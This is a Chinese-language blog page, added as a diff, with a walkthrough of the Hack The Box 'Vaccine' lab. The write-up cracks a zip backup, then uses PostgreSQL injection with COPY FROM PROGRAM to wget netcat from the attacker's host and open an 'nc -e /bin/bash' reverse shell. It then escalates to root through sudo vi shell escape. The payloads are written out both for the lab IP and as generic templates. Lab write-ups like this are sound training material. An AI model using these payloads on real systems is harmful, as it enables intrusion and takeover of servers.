@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/vaccine.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="Hackthebox-Vaccine - F0rmat&#39;s Blog">
+    <meta property="og:title" content="Hackthebox-Vaccine - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="Hackthebox-Vaccine - F0rmat&#39;s Blog">
+    <meta name="description" content="0x01前言 hackthebox练习 0x02 过程 首先直接nmap ： 发现只有三个端口，根据上一台Oopsie靶机最后给的信息 ftpuser / mc@F1l3ZilL4 直接登陆ftp，里">
+    <meta property="og:description" content="0x01前言 hackthebox练习 0x02 过程 首先直接nmap ： 发现只有三个端口，根据上一台Oopsie靶机最后给的信息 ftpuser / mc@F1l3ZilL4 直接登陆ftp，里">
+    <meta property="twitter:description" content="0x01前言 hackthebox练习 0x02 过程 首先直接nmap ： 发现只有三个端口，根据上一台Oopsie靶机最后给的信息 ftpuser / mc@F1l3ZilL4 直接登陆ftp，里">
+    <meta property="og:type" content="article">
+    <title>Hackthebox-Vaccine - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/vaccine.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/vaccine.html" title="Hackthebox-Vaccine">Hackthebox-Vaccine</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2020-12-05 00:44:00 UTC">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 05 Dec 2020
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            1390 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            3 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01前言">0x01前言</a></li>
+    <li><a href="#0x02-过程">0x02 过程</a></li>
+    <li><a href="#0x03-总结">0x03 总结</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x01前言">0x01前言</h1>
+<p>hackthebox练习</p>
+<h1 id="0x02-过程">0x02 过程</h1>
+<p>首先直接nmap ：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/1.png" alt=""></p>
+<p>发现只有三个端口，根据上一台Oopsie靶机最后给的信息</p>
+<p><strong>ftpuser / mc@F1l3ZilL4</strong></p>
+<p>直接登陆ftp，里面有个备份文件的压缩包：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/2.png" alt=""></p>
+<p>但是解压需要密码，可以使用<strong>zip2john</strong>工具，是john包含的一款把zip转换成john能破解的工具：https://github.com/openwall/john</p>
+<p><code>zip2john ~/backup.zip &gt; hash</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/3.png" alt=""></p>
+<p>使用john破解：</p>
+<p><code>John hash</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/4.png" alt=""></p>
+<p>查看解压的index.php文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/5.png" alt=""></p>
+<p>从代码逻辑看得出来只要username等于admin且密码等于密码md5加密过后的值，解密2cb42f8734ea607eefed3b70af13bbd3</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/6.png" alt=""></p>
+<p>使用该密码登陆80端口的web应用：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/7.png" alt=""></p>
+<p>存在sql注入：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/8.png" alt=""></p>
+<p>使用sqlmap跑，但是不能执行&ndash;os-shell，官方的可以，可能是网络的问题，进行sql 查询的时候就特别卡</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/9.png" alt=""></p>
+<p>网上介绍https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine</p>
+<p>可以用python脚本<strong>vaccine.py</strong></p>
+<p><a href="https://github.com/florianges/-HTB-Vaccine_sql_injection">https://github.com/florianges/-HTB-Vaccine_sql_injection</a></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/10.png" alt=""></p>
+<p>发现执行不成功，可能还是网络问题，还是乖乖放浏览器执行吧</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://10.10.10.46/dashboard.php?search=a&#39;;DROP TABLE IF EXISTS cmd_31554; -- -
+</span></span><span class="line"><span class="cl">http://10.10.10.46/dashboard.php?search=a&#39;;CREATE TABLE cmd_31554(cmd_output text); -- -
+</span></span><span class="line"><span class="cl">http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;wget -P /tmp/31554 http://10.10.14.33:80/nc&#39;; -- -
+</span></span><span class="line"><span class="cl">http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;chmod 777 /tmp/31554/nc&#39;; -- -
+</span></span><span class="line"><span class="cl">http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;/tmp/31554/nc 10.10.14.33 4444 -e /bin/bash&#39;; -- -
+</span></span></code></pre></div><p>反弹成功：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/12.png" alt=""></p>
+<p>读取postgres用户的密码：</p>
+<p><code>/var/www/html$ cat dashboard.php</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/13.png" alt=""></p>
+<p>看下postgres用户可以执行什么程序：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/14.png" alt=""></p>
+<p>编辑pg_hba.conf文件，有一些乱码输入<code>:!/bin/bash</code>即可解决</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/15.png" alt=""></p>
+<h1 id="0x03-总结">0x03 总结</h1>
+<p>1、拿到ip直接nmap</p>
+<p>2、看到有需要验证登陆的地方，可以拿其他靶机收集到的账号密码尝试登陆</p>
+<p>3、破解zip：</p>
+<p><code>zip2john xxx.zip &gt; xxx.hash</code></p>
+<p><code>john xxx.hash</code></p>
+<p>4、postgres注入执行命令：</p>
+<ul>
+<li>
+<p><code>http://x.x.x.x/dashboard.php?search=a';DROP TABLE IF EXISTS cmd_31554; -- -</code>  如果存在表则删除</p>
+</li>
+<li>
+<p><code>http://x.x.x.x/dashboard.php?search=a';CREATE TABLE cmd_31554(cmd_output text); -- -</code> 创建数据库表cmd_31554为表名，cmd_output为字段名，text为字段数据类型</p>
+</li>
+<li>
+<p><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM 'wget -P /tmp/31554 http://x.x.x.x:80/nc'; -- -</code>使用了COPY的语法，官方给的用法解释：</p>
+</li>
+</ul>
+<blockquote>
+<p>COPY moves data between PostgreSQL tables and standard file-system files. COPY TO copies the contents of a table to a file, while COPY FROM copies data from a file to a table (appending the data to whatever is in the table already). COPY TO can also copy the results of a SELECT query.</p>
+</blockquote>
+<p>就是从程序中复制数据到这个字段表里，在这里只是为了执行后面的命令。</p>
+<ul>
+<li><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM 'chmod 777 /tmp/31554/nc'; -- -</code>执行添加执行权限</li>
+<li><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM '/tmp/31554/nc 10.10.14.x 4444 -e /bin/bash'; -- -</code></li>
+<li><code>http://x.x.x.x/dashboard.php?search=a';COPY cmd_31554 FROM PROGRAM '/tmp/31554/nc 10.10.14.x 4444 -e /bin/bash'; -- -</code>执行nc反弹shell命令</li>
+</ul>
+<p>5、python建立http服务器</p>
+<ul>
+<li>Python2 <code>python -m SimpleHTTPServer</code></li>
+<li>Python3 <code>python3 -m http.server 80</code></li>
+</ul>
+<p>6、反弹交互式shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHELL=/bin/bash script -q /dev/null # 设置shell为/bin/bash，script 命令可以用作交互终端会话过程的记录，保留用户输入和系统输出的全过程。-q 是静默执行 把会话内容丢到黑洞/dev/null
+</span></span><span class="line"><span class="cl">Ctrl-Z 后台运行
+</span></span><span class="line"><span class="cl">stty raw -echo 设置原始输入禁止回显，当您在键盘上输入时，并不出现在屏幕上
+</span></span><span class="line"><span class="cl">fg 返回前台shell
+</span></span><span class="line"><span class="cl">reset 跟clear清屏差不多
+</span></span><span class="line"><span class="cl">xterm 运行标准虚拟终端
+</span></span></code></pre></div><p>7、最后一个步骤为什么可以输入<code>:!/bin/bash</code>直接就跳到root，主要出现在sudo，我们可以看下靶机的<code>/etc/sudoers</code>文件内容：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Vaccine/16.png" alt=""></p>
+<p>只要把用户加到sudoers文件里面就可以拥有root的权限，就好比如我们装ubuntu系统时候初始化是一个user权限，如果想要拥有root权限，必须在sudoers文件里面加入</p>
+<p><code>user ALL=(ALL)    ALL</code></p>
+<p>靶机里面只有用/bin/vi 编辑pg_hba.conf文件的权限，我们可以sudo 输入当前用户密码去编辑文件并在编辑状态下输入<code>:!/bin/bash</code>就能跳转到bash的shell或者输入<code>:!/bin/zsh</code>跳转到zsh的shell</p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/vaccine.html">https://xxe.icu/vaccine.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        <div class="text-base md:text-sm text-gray-500 pt-6">
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/hackthebox.html">
+                    #hackthebox
+                </a>
+                                    
+            </div>
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/bc-penetration-diary.html" class="underline text-yellow-600">bc站渗透日记</a></li>
+    
+    <li><a href="/maccms8-latest-command-execution-vulnerability.html" class="underline text-yellow-600">Maccms8最新命令执行漏洞</a></li>
+    
+    <li><a href="/seacms9.92-from-variable-override-to-getshell.html" class="underline text-yellow-600">Seacms9.92从变量覆盖到getshell</a></li>
+    
+    <li><a href="/seacms-front-desk-getshell.html" class="underline text-yellow-600">Seacms&lt;=9.92前台Getshell</a></li>
+    
+    <li><a href="/a-difficult-penetration-process.html" class="underline text-yellow-600">一次艰难的渗透提权过程</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01前言">0x01前言</a></li>
+    <li><a href="#0x02-过程">0x02 过程</a></li>
+    <li><a href="#0x03-总结">0x03 总结</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
